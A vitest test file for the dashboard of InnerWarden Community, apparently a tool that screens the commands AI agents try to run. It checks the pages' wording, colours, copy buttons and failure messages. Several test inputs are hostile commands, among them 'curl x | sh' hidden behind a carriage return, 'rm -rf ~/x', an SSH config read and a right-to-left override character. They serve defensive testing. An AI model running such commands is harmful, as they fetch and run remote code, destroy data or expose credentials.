import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ReactElement } from "react";
import type { CommunityScreenContext } from "../App";
import type { AgentsResponse, DashboardMeta, TokenIntelligenceResponse } from "../api";
import { MachineIntelligenceSeed } from "../components/MachineIntelligence";
import { setTechnicalDetail } from "../components/TechnicalDetail";
// Every fixture below was written by the CLI's own fixture writer.
import overviewFixture from "../../tests/fixtures/community/overview.json";
import page1 from "../../tests/fixtures/community/decisions-page-1.json";
import byId from "../../tests/fixtures/community/decisions-by-id.json";
import historyFixture from "../../tests/fixtures/community/history.json";
import attemptsFixture from "../../tests/fixtures/community/history-attempts.json";
import protectionFixture from "../../tests/fixtures/community/protection.json";
import agentsFixture from "../../tests/fixtures/community/agents.json";
import tokensFixture from "../../tests/fixtures/community/token-intelligence.json";
import { readAttemptsPage, readDecisionDetail, readDecisionsPage, readHistory, readProtection, readRecordHealth } from "./api";

/**
 * The Community pages, RENDERED from the CLI's fixtures, with each polled
 * source answered at once. What is asserted is what a reader sees: the
 * words, the order, and the colours (by their one job each).
 */
const answers = new Map<string, unknown>();
const failing = new Set<string>();

function lookupOf(key: string): string {
  if (key.startsWith("{")) return key.includes("reasonNot") ? "decisions-hidden" : "decisions";
  if (key.startsWith("cmd:")) return `decision:${key}`;
  if (key.startsWith("recent-without:")) return key === "recent-without:" ? "none" : "recent-without";
  return key;
}

vi.mock("./poll", () => ({
  usePolled: (_load: unknown, _delay: number, key = "") => {
    const lookup = lookupOf(key);
    if (failing.has(lookup)) return { error: new Error("unreadable"), loading: false, stale: false, refresh: () => undefined };
    const data = answers.get(lookup);
    return data === undefined
      ? { loading: true, stale: false, refresh: () => undefined }
      : { data, loading: false, stale: false, refresh: () => undefined };
  },
}));

const { CommunityOverview } = await import("./Overview");
const { CommunityCases } = await import("./Cases");
const { CommunityProtection } = await import("./Protection");
const { CommunityAgents } = await import("./Agents");
const { CommunityTokens } = await import("./Tokens");
const { Notices } = await import("./Notices");
const { HeaderStatus } = await import("./HeaderStatus");
const { COMMUNITY_SHELL } = await import("./shell");

const META: DashboardMeta = { version: "1.5.0", exposed: false, edition: "community", guardrail: { mode: "partial", guarded_agents: 3 } };

function context(search = "", meta: DashboardMeta = META, os = "macos"): CommunityScreenContext {
  return {
    meta,
    metaStatus: "ready",
    navigate: () => undefined,
    search,
    bootstrap: { platform: { os, architecture: "arm64", enterprise_candidate: false, reason_code: null } } as never,
  };
}

function seed() {
  answers.clear();
  failing.clear();
  answers.set("overview", overviewFixture);
  answers.set("overview-record", overviewFixture);
  answers.set("recent-flagged", readDecisionsPage({ ...page1, items: page1.items.slice(0, 15) }));
  answers.set("decisions", readDecisionsPage(page1));
  answers.set("flagged-count", readDecisionsPage(page1));
  answers.set("agents", agentsFixture);
  answers.set("tokens", tokensFixture);
  answers.set("record-health", readRecordHealth({ recording: true }));
  answers.set("history", readHistory(historyFixture));
  answers.set("", readAttemptsPage(attemptsFixture));
  answers.set("protection", readProtection(protectionFixture));
  for (const [id, detail] of Object.entries(byId)) answers.set(`decision:${id}`, readDecisionDetail(detail));
}

beforeEach(() => {
  seed();
  setTechnicalDetail(false);
  try {
    window.localStorage.clear();
  } catch {
    // No storage in this environment: every offer reads as not dismissed.
  }
});

afterEach(() => setTechnicalDetail(false));

/**
 * Rendered with the agent and token panels SEEDED from the fixtures: the
 * technical view's spec sheets draw their real content, not their loading
 * state, so the colour rules below are checked against what a reader sees.
 */
const render = (element: ReactElement) =>
  renderToStaticMarkup(
    <MachineIntelligenceSeed.Provider value={{ agents: agentsFixture as unknown as AgentsResponse, tokens: tokensFixture as unknown as TokenIntelligenceResponse }}>
      {element}
    </MachineIntelligenceSeed.Provider>,
  );

const ENTITIES: Record<string, string> = { "&#x27;": "'", "&quot;": '"', "&lt;": "<", "&gt;": ">", "&amp;": "&" };

/**
 * What a reader reads: the markup's text, tags gone, entities read back.
 * Tags are removed until none is left (one pass can leave a tag its own
 * removal put together), and entities are read back in ONE pass, so "&amp;lt;"
 * stays "&lt;" as the page shows it.
 */
function textOf(html: string): string {
  let text = html;
  let previous: string;
  do {
    previous = text;
    text = text.replace(/<[^<>]*>/g, "");
  } while (text !== previous);
  return text.replace(/&(?:#x27|quot|lt|gt|amp);/g, (entity) => ENTITIES[entity]);
}

/** Every command box's text, as a reader sees it (its words are spans). */
function commandBoxes(html: string): { text: string; copy: boolean; template: boolean }[] {
  const boxes: { text: string; copy: boolean; template: boolean }[] = [];
  for (const match of html.matchAll(/<code data-command="[^"]*"( data-template="[^"]*")?[^>]*>([\s\S]*?)<\/code>(\s*<button[^>]*aria-label="Copy the command)?/g)) {
    boxes.push({ text: textOf(match[2]), template: match[1] !== undefined, copy: match[3] !== undefined });
  }
  return boxes;
}

type Open = { tag: string; attrs: string };

/**
 * Every class token on the page with the attributes of every element around
 * it, from the markup alone. Enough HTML to walk React's own output: tags,
 * void elements and self-closing SVG.
 */
function classesWithAncestors(html: string): { classes: string[]; ancestors: string }[] {
  const out: { classes: string[]; ancestors: string }[] = [];
  const stack: Open[] = [];
  const voids = new Set(["area", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"]);
  const tag = /<(\/?)([a-zA-Z][a-zA-Z0-9-]*)([^>]*?)(\/?)>/g;
  for (const match of html.matchAll(tag)) {
    const [, closing, name, attrs, selfClosing] = match;
    if (closing) {
      const at = stack.map((open) => open.tag).lastIndexOf(name);
      if (at !== -1) stack.length = at;
      continue;
    }
    const classMatch = /class="([^"]*)"/.exec(attrs);
    const ancestors = [...stack.map((open) => open.attrs), attrs].join(" ");
    if (classMatch) out.push({ classes: classMatch[1].split(/\s+/), ancestors });
    if (!selfClosing && !voids.has(name.toLowerCase())) stack.push({ tag: name, attrs });
  }
  return out;
}

/** The colour rule of every Community page (spec M5). */
function expectColourJobs(html: string) {
  for (const { classes, ancestors } of classesWithAncestors(html)) {
    for (const token of classes) {
      expect(token, "emerald is a confirmed read back; Community confirms nothing").not.toMatch(/emerald-/);
      if (/amber-/.test(token)) expect(ancestors, `${token} outside a needs-you element`).toMatch(/data-needs-you/);
      if (/rose-/.test(token)) {
        expect(ancestors, `${token} outside a bad outcome, a No, or an exposed dashboard`).toMatch(
          /data-outcome="unsafe_may_have_run"|data-mark="no"|data-exposed/,
        );
      }
    }
  }
}

function links(html: string): string[] {
  return [...html.matchAll(/href="(https:\/\/innerwarden\.com[^"]*)"/g)].map((match) => match[1]);
}

type FixtureItem = { outcome_key: string; command: string; command_whole: boolean; next: { command?: string; command_is_template?: boolean; view_action?: string }[] };
const BY_ID = byId as unknown as Record<string, { item: FixtureItem }>;
const OPEN_CASES = Object.keys(BY_ID).filter((id) => BY_ID[id].item.outcome_key !== "allowed");
const CASE_WOULD_REFUSE = page1.items.find((item) => item.command === "cat ~/.ssh/config")!.id;
const caseHtml = (id: string) => render(<CommunityCases context={context(`?view=activity&decision=${encodeURIComponent(id)}`)} />);

describe("the colour jobs, on every Community page", () => {
  for (const technical of [false, true]) {
    it(`hold on every page in the ${technical ? "technical" : "plain"} view`, () => {
      setTechnicalDetail(technical);
      const pages = [
        render(<CommunityOverview context={context()} />),
        render(<CommunityCases context={context("?view=activity")} />),
        render(<CommunityProtection context={context()} />),
        render(<CommunityAgents />),
        render(<CommunityTokens />),
        render(<CommunityCases context={context("?view=activity&lane=agent_messages&decision=" + attemptsFixture.items[0].id)} />),
      ];
      for (const id of OPEN_CASES) pages.push(caseHtml(id));
      for (const html of pages) expectColourJobs(html);
    });
  }

  /**
   * FAILS ON REVERT: before `tones="neutral"` the technical view's agent and
   * token spec sheets drew emerald "Available" and amber "Partial" badges,
   * and this test could not see them: the panels rendered their loading state.
   */
  it("sees the technical view's spec sheets, and they are neutral", () => {
    setTechnicalDetail(true);
    for (const [html, panel] of [
      [render(<CommunityOverview context={context()} />), "Agents on this machine"],
      [render(<CommunityAgents />), "Agents on this machine"],
      [render(<CommunityTokens />), "Tokens observed"],
    ] as const) {
      // The seeded panels are drawn, not their loading state.
      expect(html).toContain(panel);
      expectColourJobs(html);
      expect(html).not.toContain("Runtime not confirmed");
    }
  });

  /** FAILS ON REVERT: put the old emerald "Allowed" chip back and this fails. */
  it("would catch an emerald chip, an amber flag and a rose verdict", () => {
    expect(() => expectColourJobs('<span class="bg-emerald-50">Allowed</span>')).toThrow();
    expect(() => expectColourJobs('<span class="text-amber-900">Needs review</span>')).toThrow();
    expect(() => expectColourJobs('<span class="text-rose-800">Deny</span>')).toThrow();
    expect(() => expectColourJobs('<p data-needs-you=""><span class="text-amber-900">!</span></p>')).not.toThrow();
  });

  it("draws the notices in their own colours, in order", () => {
    const html = render(<Notices meta={{ ...META, exposed: true, update_pending: true, update_note: "A newer InnerWarden is installed. Restart the dashboard to use it." }} health={{ recording: false, sinceUnix: 1_790_690_000, lostActions: 37 }} />);
    expectColourJobs(html);
    expect(html.indexOf("open to the network")).toBeLessThan(html.indexOf("not recording"));
    expect(html.indexOf("not recording")).toBeLessThan(html.indexOf("A newer InnerWarden"));
    expect(html).toContain("37 actions were not recorded");
    expect(render(<Notices meta={META} health={{ recording: true }} />)).toBe("");
  });
});

describe("the header", () => {
  const chips = (html: string) => html.match(/data-chip=/g)?.length ?? 0;

  it("carries ONE chip, the most severe thing that is true, in both views", () => {
    const plain = render(<HeaderStatus meta={META} metaStatus="ready" />);
    expect(plain).toContain("Partly connected");
    expect(plain).not.toMatch(/class="[^"]*\bhidden\b/);
    const exposed = render(<HeaderStatus meta={{ ...META, exposed: true }} metaStatus="ready" />);
    expect(exposed).toContain("Open to the network");
    expect(exposed).not.toContain("Partly connected");
    expectColourJobs(exposed);
    answers.set("record-health", readRecordHealth({ recording: false }));
    const outage = render(<HeaderStatus meta={META} metaStatus="ready" />);
    expect(outage).toContain("Not recording");
    for (const technical of [false, true]) {
      setTechnicalDetail(technical);
      for (const html of [plain, exposed, outage, render(<HeaderStatus meta={{ ...META, exposed: true }} metaStatus="ready" />)]) expect(chips(html)).toBe(1);
      expect(render(<HeaderStatus meta={META} metaStatus="ready" />)).not.toContain("Local only");
    }
  });

  it("says Local only once, at the foot of the page, in the technical view", () => {
    const page = COMMUNITY_SHELL.screens.find((screen) => screen.route === "tokens")!;
    expect(render(<>{page.render(context())}</>)).not.toContain("Local only");
    setTechnicalDetail(true);
    expect(render(<>{page.render(context())}</>)).toContain("Local only");
  });
});

describe("the Overview", () => {
  it("leads with what the agent did, then messages, then what Community does not watch", () => {
    const html = render(<CommunityOverview context={context()} />);
    const order = ["agent_actions", "agent_messages", "server_attacks"].map((lane) => html.indexOf(`data-lane="${lane}"`));
    expect(order).toEqual([...order].sort((a, b) => a - b));
    expect(html).toContain("From this machine&#x27;s own records.");
    expect(html).toContain("See the flagged commands");
  });

  it("names the attacks card for this machine, and says Community does not watch it", () => {
    const mac = render(<CommunityOverview context={context()} />);
    const server = mac.slice(mac.indexOf('data-lane="server_attacks"'));
    expect(server).toContain("Attacks on this machine");
    expect(server).toContain("Active Defence watches this on Linux servers.");
    // Said once: the CLI's sentence says Community does not watch it, and the
    // line under the heading does not say it again.
    expect(textOf(server).match(/does not watch/g)).toHaveLength(1);
    expect(server).not.toContain("honeypot");
    const linux = render(<CommunityOverview context={context("", META, "linux")} />);
    expect(linux.slice(linux.indexOf('data-lane="server_attacks"'))).toContain("Attacks on this server");
  });

  it("makes one offer, led by this machine's own count, and links out once", () => {
    const html = render(<CommunityOverview context={context()} />);
    expect(links(html)).toEqual(["https://innerwarden.com/pricing"]);
    const server = textOf(html.slice(html.indexOf('data-lane="server_attacks"')));
    // flagged_ran 20 + unsafe_may_have_run 1, from the agent card's own split.
    expect(server).toContain("21 flagged commands ran here since 25 Sept 2026: Community relies on your agent asking first.");
    expect(server).toContain("On a Linux server, Active Defence adds the kernel Execution Gate");
    expect(server).not.toMatch(/would have (stopped|refused|blocked)/);
  });

  it("prints each part of a split in the same words the Cases page does", () => {
    const overview = textOf(render(<CommunityOverview context={context()} />));
    const cases = textOf(render(<CommunityCases context={context("?view=activity")} />));
    for (const words of ["Refused before it ran", "Would have been refused", "Flagged, and it ran", "Judged unsafe, and it ran"]) {
      expect(overview, words).toContain(words);
      expect(cases, words).toContain(words);
    }
    expect(overview).not.toContain("would have been refused (monitor mode)");
  });

  it("brings the guard's long log onto the page people open first", () => {
    const html = render(<CommunityOverview context={context()} />);
    expect(textOf(html)).toContain("123 refused before they ran since 30 Jul 2026, from the guard's log.");
    expect(links(html).length).toBe(1);
  });

  it("gives a watching agent the CLI's own command that refuses what would have been refused", () => {
    const text = textOf(render(<CommunityOverview context={context()} />));
    expect(text).toContain("6 commands would have been refused since 25 Sept 2026. innerwarden enforce refuses them.");
  });

  it("counts the record, and says a check by hand is one of them", () => {
    const text = textOf(render(<CommunityOverview context={context()} />));
    expect(text).toContain("96 decisions since 25 Sept 2026");
    expect(text).toContain("1 of them a check by hand.");
    expect(text).toContain("Recording.");
    expect(text).not.toContain("Recording every decision");
  });

  it("says a failed source in its own place and still draws the others", () => {
    failing.add("agents");
    failing.add("overview");
    const html = render(<CommunityOverview context={context()} />);
    expect(html).toContain("Agents did not answer");
    expect(html).toContain("The decision record could not be read");
    expect(html).toContain("Could not be read.");
    expect(html).toContain("tokens");
    expect(html).not.toContain("The local dashboard is unavailable");
    expect(html).not.toContain("Recording.");
  });

  it("lists the five newest flagged situations, a run of one reason folded, never a session id", () => {
    const html = render(<CommunityOverview context={context()} />);
    expect(html.match(/data-case-row=/g)?.length).toBe(5);
    // The agent's scratch script and the six build-cache scripts in a row are
    // ONE situation, not seven rows.
    expect(html).toContain("6 more in a row, flagged for the same reason");
    expect(html).toContain("bash /tmp/agent-scratch/0e6f3c1a-5b2d-4c7e-9a10-2f3b4c5d6e7f/check.sh");
    expect(html).not.toContain("bash /tmp/build-cache/step-1.sh");
    expect(textOf(html)).not.toMatch(/[0-9a-f]{8}-demo-4000/);
  });

  /** One reason can be three quarters of a real record: the list must still show the rest. */
  it("folds a reason that is more than half of everything flagged into one line, and can show it", () => {
    const page = readDecisionsPage(page1);
    const top = page.reasons[0];
    answers.set("recent-flagged", { ...page, flaggedTotal: 20, reasons: [{ ...top, count: 15 }, ...page.reasons.slice(1)] });
    answers.set("recent-without", { ...page, items: page.items.filter((item) => item.reason.key !== top.key) });
    const html = render(<CommunityOverview context={context()} />);
    expect(textOf(html)).toContain("15 from the world-writable folder rule, hidden here.");
    expect(html).not.toContain("/tmp/build-cache/run.sh");
    expect(html.match(/data-case-row=/g)?.length).toBe(5);
  });

  it("never says nothing was flagged when rows could not be drawn", () => {
    answers.set("recent-flagged", { ...readDecisionsPage(page1), items: [] });
    const html = render(<CommunityOverview context={context()} />);
    expect(html).not.toContain("Nothing flagged");
    expect(textOf(html)).toContain("30 flagged could not be shown.");
  });

  it("claims installation, never protection, where Active Defence is installed", () => {
    const html = render(<CommunityOverview context={context("", { ...META, active_defence_installed: true })} />);
    expect(html).toContain('data-ad-state="installed"');
    expect(links(html)).toEqual([]);
    for (const word of [" armed", "enforcing", "protected"]) expect(html.toLowerCase()).not.toContain(word);
  });
});

describe("the first run", () => {
  const ZERO = {
    ...overviewFixture,
    lanes: {
      agent_actions: { lane: "agent_actions", availability: "no_source", sentence: "No agent is connected to the guard yet.", next_step: { command: "innerwarden agents connect --all --monitor", line: "Connects every agent it finds." } },
      agent_messages: { lane: "agent_messages", availability: "no_source", sentence: "Recording what people ask your agent needs OpenClaw, a chat gateway for agents. None is set up on this machine." },
      server_attacks: { lane: "server_attacks", availability: "no_source", sentence: "Community watches what your AI agents try to run. It does not watch this machine itself." },
    },
    record: { decisions: 0, flagged: 0, checked: 0 },
  };

  it("shows its first steps before any card, with no offer and no link out", () => {
    answers.set("overview", ZERO);
    const html = render(<CommunityOverview context={context()} />);
    expect(html.indexOf("data-get-started")).toBeGreaterThan(0);
    expect(html.indexOf("data-get-started")).toBeLessThan(html.indexOf("data-lane="));
    expect(links(html)).toEqual([]);
    expect(html).not.toContain("data-offer");
    // The connect command is said once, in the steps, not again in the card.
    expect(commandBoxes(html).filter((box) => box.text === "innerwarden agents connect --all --monitor").length).toBe(1);
    expect(html).toContain("Start with the steps above.");
    // The page they are reading is not a step.
    expect(commandBoxes(html).some((box) => box.text === "innerwarden dashboard")).toBe(false);
    // No observe install where there is no OpenClaw.
    expect(html).not.toContain("innerwarden observe install");
  });

  it("asks for an agent before offering to connect one, when none is here", () => {
    answers.set("overview", ZERO);
    answers.set("agents", { ...agentsFixture, agents: [] });
    const html = render(<CommunityOverview context={context()} />);
    expect(textOf(html)).toContain("Install a supported agent (Claude Code, Codex, Cursor, Gemini CLI), then connect it");
    expect(commandBoxes(html).some((box) => box.text.includes("agents connect"))).toBe(false);
  });
});

describe("Cases", () => {
  it("counts the flagged decisions, splits them by outcome, and names the reasons", () => {
    const html = render(<CommunityCases context={context("?view=activity")} />);
    expect(html).toContain(`${page1.flagged_total}</span>`);
    expect(html).toContain("Why they were flagged");
    expect(html).toContain("world-writable folder");
    expect(html).toContain(`25 rows on this page of ${page1.total}`);
    expect(html).toContain("more in a row, flagged for the same reason");
    // The agent's own tab says its count too, the same figure.
    expect(textOf(html)).toMatch(new RegExp(`What your AI agent did${page1.flagged_total}`));
  });

  it("never prints a rule id where a reason's words go", () => {
    const text = textOf(render(<CommunityCases context={context("?view=activity")} />));
    expect(text).not.toMatch(/\[ATR-/);
    expect(text).toContain("high-risk tool invocation without human");
  });

  /**
   * A rule's quoted words are code, never stray backticks ("path: `.ssh/`."),
   * and a short code word stays whole on a phone ("my-" / "app" before).
   */
  it("prints a rule's quoted words as code, kept whole", () => {
    const credential = page1.items.find((item) => item.concern === "credential_read")!;
    const detail = caseHtml(credential.id);
    const story = detail.slice(detail.indexOf(">What happened</dt>"), detail.indexOf(">What InnerWarden did</dt>"));
    expect(textOf(story)).not.toContain("`");
    const codes = [...story.matchAll(/<code data-segment-code="" class="([^"]*)">([^<]*)<\/code>/g)];
    expect(codes.map((match) => match[2])).toContain("my-app");
    for (const [, classes, text] of codes) {
      expect(classes, text).toContain(text.length > 28 ? "[overflow-wrap:anywhere]" : "whitespace-nowrap");
    }
    expect(codes.some(([, , text]) => text.startsWith("."))).toBe(true);
  });

  it("shows every case's three parts, in order, with what you can do", () => {
    for (const id of OPEN_CASES) {
      const html = caseHtml(id);
      const detail = html.slice(html.indexOf('aria-labelledby="case-title"'));
      const parts = ["What happened", "What InnerWarden did", "What you can do"].map((term) => detail.indexOf(`>${term}</dt>`));
      expect(parts.every((at) => at > 0), id).toBe(true);
      expect(parts, id).toEqual([...parts].sort((a, b) => a - b));
      expect(links(html).length, id).toBeLessThanOrEqual(1);
    }
  });

  it("prints the CLI's commands exactly as sent", () => {
    const would = page1.items.find((item) => item.outcome_key === "would_have_refused")!;
    const boxes = commandBoxes(caseHtml(would.id)).map((box) => box.text);
    for (const step of would.next) {
      if ("command" in step && step.command !== undefined) expect(boxes).toContain(step.command);
    }
  });

  /**
   * FAILS ON REVERT: a template (`innerwarden allow "<pattern>"`) and a
   * command shortened or shown written out each had a Copy button, and
   * pasted as they are they allow the literal `<pattern>` or run something
   * other than what ran.
   */
  it("offers Copy only for a command that works as it is", () => {
    let templates = 0;
    let notWhole = 0;
    for (const id of OPEN_CASES) {
      const item = BY_ID[id].item;
      for (const box of commandBoxes(caseHtml(id))) {
        if (box.template || /<[^<>]+>/.test(box.text)) {
          templates += 1;
          expect(box.copy, `${id}: ${box.text}`).toBe(false);
        }
        if (box.text === item.command && !item.command_whole) {
          notWhole += 1;
          expect(box.copy, `${id}: ${box.text}`).toBe(false);
        }
      }
    }
    // Anti-vacuous: the fixtures hold both kinds.
    expect(templates).toBeGreaterThan(0);
    expect(notWhole).toBeGreaterThan(0);
  });

  it("says why a shortened or revealed command has nothing to copy", () => {
    const revealed = Object.keys(BY_ID).find((id) => BY_ID[id].item.command.includes("\\u{202E}"))!;
    const html = caseHtml(revealed);
    expect(html).toContain("Contains hidden characters");
    expect(html).toContain("Shown with its hidden characters written out, so there is nothing whole to copy.");
  });

  it("offers to hide a per-session scratch script's reason from the list, never an allow that cannot match", () => {
    const scratch = Object.keys(BY_ID).find((id) => BY_ID[id].item.command.includes("/agent-scratch/"))!;
    const html = caseHtml(scratch);
    expect(html).toContain('data-hide-reason="rule:tmp_execution"');
    expect(commandBoxes(html).some((box) => box.text.startsWith("innerwarden allow"))).toBe(false);
  });

  it("lists a hidden reason's view: the count without it, and a way back", () => {
    answers.set("decisions-hidden", readDecisionsPage({ ...page1, total: 15, items: page1.items.filter((item) => item.reason.key !== "rule:tmp_execution") }));
    const html = render(<CommunityCases context={context("?view=activity&hide=rule%3Atmp_execution")} />);
    expect(textOf(html)).toContain("15 flagged without world-writable folder");
    expect(html).toContain("Show them again");
    expect(html).not.toContain("/tmp/build-cache/run.sh");
  });

  /**
   * FAILS ON REVERT: a decision whose command held a hidden character was
   * dropped by the reader, and a page of them said "Nothing flagged".
   */
  it("shows a command with hidden characters as a row with a chip, never as nothing", () => {
    const raw = {
      ...page1,
      items: page1.items.slice(0, 3).map((item, index) => ({
        ...item,
        command: ["ls ‮malicious", "rm -rf ~/x # ​", "ls\rcurl x | sh # \u{E0041}"][index],
      })),
    };
    answers.set("decisions", readDecisionsPage(raw));
    const html = render(<CommunityCases context={context("?view=activity")} />);
    expect(html.match(/data-case-row=/g)?.length).toBe(3);
    expect(html.match(/data-hidden-characters=/g)?.length).toBe(3);
    expect(html).toContain("ls \\u{202E}malicious");
    expect(html).not.toContain("Nothing flagged");
  });

  it("names Secret Read Guard only on a case that reached for a credential", () => {
    const credential = page1.items.find((item) => item.concern === "credential_read" && item.outcome_key === "would_have_refused")!;
    const other = page1.items.find((item) => item.concern === "other" && item.outcome_key === "flagged_ran")!;
    expect(caseHtml(credential.id)).toContain("Secret Read Guard");
    const html = caseHtml(other.id);
    expect(html).not.toContain("Secret Read Guard");
    expect(html).toContain("Execution Gate");
  });

  it("puts an offer under the case, as one short line, never inside it", () => {
    const other = page1.items.find((item) => item.concern === "other" && item.outcome_key === "flagged_ran")!;
    const html = caseHtml(other.id);
    const card = html.slice(html.indexOf('data-case="'), html.indexOf("</section>", html.indexOf('data-case="')));
    expect(card).not.toContain("data-offer");
    expect(html).toContain('data-offer="execution_gate"');
    // A text link, not a button that outweighs the reader's own Copy.
    const offer = html.slice(html.indexOf('data-offer="execution_gate"'));
    expect(offer.slice(0, offer.indexOf("</aside>"))).not.toMatch(/<a[^>]*class="[^"]*border/);
  });

  it("names the agent of a session only when the record names it", () => {
    const named = caseHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
    expect(named).toContain("In a session of Claude Code (4b1d9c2e)");
    answers.set("decision:cmd:local:0", readDecisionDetail(BY_ID["cmd:local:0"]));
    const checked = caseHtml("cmd:local:0");
    expect(checked).toContain("In this session (local)");
    expect(checked).not.toContain("In a session of You");
  });

  it("says each neighbour's outcome in words at every width, for a screen reader", () => {
    const html = caseHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
    const around = html.slice(html.indexOf('id="around-title"'));
    const rows = around.match(/data-outcome-words="[a-z_]+"[^>]*class="([^"]*)"/g) ?? [];
    expect(rows.length).toBeGreaterThan(0);
    for (const row of rows) {
      expect(row).toContain("sr-only");
      expect(row).toContain("sm:not-sr-only");
      expect(row).not.toMatch(/\bhidden\b/);
    }
  });

  /** FAILS ON REVERT: an outcome the record does not hold was titled "ran". */
  it("says an agent ran a command only where the record says it ran", async () => {
    const { caseTitle } = await import("./CaseDetail");
    expect(caseTitle({ agent: "Claude Code", channel: "hook", outcomeKey: "unplaced" })).toBe("Claude Code tried a command the guard flagged");
    expect(caseTitle({ channel: "mcp", outcomeKey: "unplaced" })).toBe("An agent tried a tool call the guard flagged");
    expect(caseTitle({ agent: "Claude Code", channel: "hook", outcomeKey: "flagged_ran" })).toBe("Claude Code ran a command the guard flagged");
    const unplaced = { ...BY_ID[CASE_WOULD_REFUSE] };
    answers.set(`decision:${CASE_WOULD_REFUSE}`, readDecisionDetail({ ...unplaced, item: { ...unplaced.item, outcome_key: "unplaced" } }));
    const html = caseHtml(CASE_WOULD_REFUSE);
    expect(html).toContain("tried a command the guard flagged");
    expect(html).not.toContain(" ran a command the guard flagged");
  });

  it("says a case the record dropped is gone, and why", () => {
    answers.set("decision:cmd:gone:1", "decision_not_in_record");
    const html = render(<CommunityCases context={context("?view=activity&decision=cmd%3Agone%3A1")} />);
    expect(html).toContain("This case is no longer in the record");
  });

  it("says a list that could not be read, never that nothing was flagged", () => {
    failing.add("decisions");
    const html = render(<CommunityCases context={context("?view=activity")} />);
    expect(html).toContain("The decision record could not be read");
    expect(html).not.toContain("Nothing flagged");
  });

  it("offers the messages tab, and no attacks or Everything tab", () => {
    const html = render(<CommunityCases context={context("?view=activity")} />);
    expect(html).toContain('data-lane="agent_messages"');
    expect(html).not.toContain('data-lane="server_attacks"');
    expect(html).not.toContain('data-lane="everything"');
  });
});

describe("a message someone sent the agent", () => {
  const first = attemptsFixture.items[0];
  const open = (search: string) => render(<CommunityCases context={context(search)} />);

  it("gives a real Community step first, then the offer as one line under the case", () => {
    const html = open(`?view=activity&lane=agent_messages&decision=${first.id}`);
    const text = textOf(html);
    expect(text).toContain("If your agent had obeyed, the guard would have screened what it ran.");
    expect(commandBoxes(html).map((box) => box.text)).toContain("innerwarden enforce");
    expect(text.indexOf("What you can do")).toBeLessThan(text.indexOf("Observe records; it cannot stop"));
    expect(html).toContain("Contains hidden characters");
  });

  it("makes no offer for a message InnerWarden stopped", () => {
    const stopped = { ...attemptsFixture, items: [{ ...first, outcome_key: "stopped_by_innerwarden" }] };
    answers.set("", readAttemptsPage(stopped));
    const html = open(`?view=activity&lane=agent_messages&decision=${first.id}`);
    expect(html).not.toContain("data-offer");
    expect(textOf(html)).toContain("Nothing to do: InnerWarden stopped it.");
  });

  it("says the lane's own words, and the count's span, never a zero it did not read", () => {
    const html = open("?view=activity&lane=agent_messages");
    expect(textOf(html)).toContain("Risky messages people sent your agent, one case each");
    expect(textOf(html)).toContain(`${attemptsFixture.total} recorded since 30 Jul 2026`);
    answers.delete("");
    expect(textOf(open("?view=activity&lane=agent_messages"))).not.toContain("0 recorded");
  });
});

describe("Protection, Agents and Tokens", () => {
  it("lists what Community covers, what it did, and what it does not cover, with one link out", () => {
    const html = render(<CommunityProtection context={context()} />);
    expect(html).toContain("What Community covers on this Mac");
    expect(html).toContain("What Community did for you");
    expect(html).toContain("Not in Community");
    expect(html).toContain("Execution Gate");
    expect(links(html)).toEqual(["https://innerwarden.com/docs/editions-and-guarantees"]);
    expect(html).toContain('data-tour="upgrade"');
  });

  it("proves its value before the controls: what it did sits under the ring", () => {
    const html = render(<CommunityProtection context={context()} />);
    expect(html.indexOf('id="did-title"')).toBeLessThan(html.indexOf('data-control="command_screening"'));
    expect(html.indexOf('id="coverage-title"')).toBeLessThan(html.indexOf('id="did-title"'));
  });

  it("never says 0 Refusing beside agents that refuse", () => {
    const html = render(<CommunityProtection context={context()} />);
    const text = textOf(html);
    expect(text).toContain("Some refuse");
    expect(text).not.toMatch(/0\s*Refusing/);
    const tools = textOf(html.slice(html.indexOf('data-control="tool_call_screening"'), html.indexOf('data-control="decision_record"')));
    expect(tools).toContain("Cursor and Gemini CLI refuse a deny. Codex is not fully behind the guard.");
    expect(tools).not.toContain("nothing is refused");
  });

  it("ties each paid row with a fact here to this machine's own count", () => {
    const html = render(<CommunityProtection context={context()} />);
    const facts = textOf(html.slice(html.indexOf('id="not-in-community-title"')));
    expect(facts).toContain("21 flagged commands ran on this machine since 25 Sept 2026.");
    expect(facts).toContain("4 cases here reached for a credential file since 25 Sept 2026.");
    expect(facts).toContain("2 flagged commands here fetched from the internet by name since 25 Sept 2026.");
  });

  it("draws refusals per FULL week, leaving out the week still under way", async () => {
    const { fullWeeks } = await import("./Protection");
    const history = readHistory(historyFixture);
    expect(history.refusals.weeks.at(-1)?.partial).toBe(true);
    expect(fullWeeks(history).every((week) => !week.partial)).toBe(true);
    expect(fullWeeks(history).length).toBe(history.refusals.weeks.length - 1);
    expect(render(<CommunityProtection context={context()} />)).toContain("per full week");
  });

  it("gives each agent its state and the CLI's command, with no link out", () => {
    const html = render(<CommunityAgents />);
    expect(html).toContain("Partly connected");
    expect(commandBoxes(html).map((box) => box.text)).toContain("innerwarden agents connect codex --monitor");
    expect(html).toContain("Last screened a command");
    expect(html).toContain("Last screened a tool call");
    expect(html).toContain("No tool call screened yet.");
    expect(links(html)).toEqual([]);
  });

  it("draws token use once per agent, with the provenance said once, and no link out", () => {
    const html = render(<CommunityTokens />);
    expect(html.match(/prompts and responses never reach this dashboard/g)?.length).toBe(1);
    expect(html).toContain("1,271,432,724");
    expect(html).toContain("1.3 billion");
    expect(html).toContain("1.0 billion");
    expect(html).toContain("Keeps no token history InnerWarden can read.");
    expect(links(html)).toEqual([]);
  });
});
